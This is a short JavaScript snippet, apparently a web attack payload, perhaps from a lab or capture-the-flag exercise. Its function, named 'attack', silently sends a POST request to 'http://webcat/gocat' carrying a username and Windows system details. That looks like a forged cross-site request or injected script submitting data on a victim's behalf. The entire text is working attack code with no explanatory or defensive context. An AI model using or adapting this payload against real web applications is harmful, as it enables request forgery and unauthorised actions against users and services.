function attack(){
	var xhr = new XMLHttpRequest();
	xhr.open('POST', 'http://webcat/gocat', true);
	xhr.send('qwe=samsonova%3BMicrosoft+Windows+7+None+None+None++None+None+None%3B');
}